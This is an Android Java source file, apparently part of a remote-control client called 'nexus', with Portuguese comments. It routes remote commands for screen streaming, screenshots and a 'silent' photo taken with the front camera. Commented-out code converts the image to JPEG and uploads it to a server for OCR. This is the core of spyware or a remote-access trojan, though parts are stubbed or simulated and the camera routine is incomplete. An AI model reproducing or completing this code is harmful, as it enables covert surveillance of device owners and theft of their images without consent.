package com.nexus.client;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Handler;
import android.os.Looper;
import java.io.ByteArrayOutputStream;

public class CommandRouter {
    private static ScreenStreamer screenStreamer;

    public static void execute(Context context, String command) {
        switch (command) {
            case "start_stream":
                // Necessário passar o Intent de permissão do MediaProjection (pré-autorizado)
                // Em um ambiente real, você guarda o Intent na SharedPreferences após o usuário conceder.
                break; 
                
            case "stop_stream":
                if (screenStreamer != null) {
                    screenStreamer.stop();
                    screenStreamer = null;
                }
                break;
                
            case "take_picture":
                captureSilentPhoto();
                break;
                
            case "screenshot":
                // A captura de tela estática pode ser feita pelo mesmo MediaProjection,
                // mas requer root ou o Intent. Aqui usamos a câmera pra exemplificar.
                break;
        }
    }

    private static void captureSilentPhoto() {
        try {
            // Abre a câmera frontal de forma silenciosa, tira o frame e envia
            Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            camera.setPreviewCallback((data, cam) -> {
                // O 'data' do preview é YUV420, mas para o OCR do Python (Tesseract) 
                // precisamos de JPEG. Numa implementação de produção, converte-se YUV -> JPEG.
                // Para simplificar o teste de bancada, simulamos o envio.
                cam.stopPreview();
                cam.release();
            });
            
            // O código completo de conversão YUV para JPEG e envio:
            // Bitmap bitmap = yuvToJpeg(data, camera.getParameters());
            // ByteArrayOutputStream stream = new ByteArrayOutputStream();
            // bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
            // NetworkManager.sendMedia(stream.toByteArray(), "camera");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}